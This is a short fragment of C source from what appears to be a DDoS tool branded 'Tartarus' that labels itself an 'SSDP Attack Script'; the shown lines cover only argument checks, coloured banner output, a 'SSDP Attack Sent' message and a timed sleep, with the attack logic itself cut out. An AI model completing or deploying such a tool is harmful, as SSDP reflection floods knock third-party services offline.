...
{
        if(argc < 4){
                fprintf(stderr, "\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[38;5;202mSSDP Attack Script\n");
        ...
        fprintf(stdout, "\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[38;5;202mSSDP Attack Sent.\n");
        if(argc > 5)
        {
                sleep(atoi(argv[5]));
        } else {
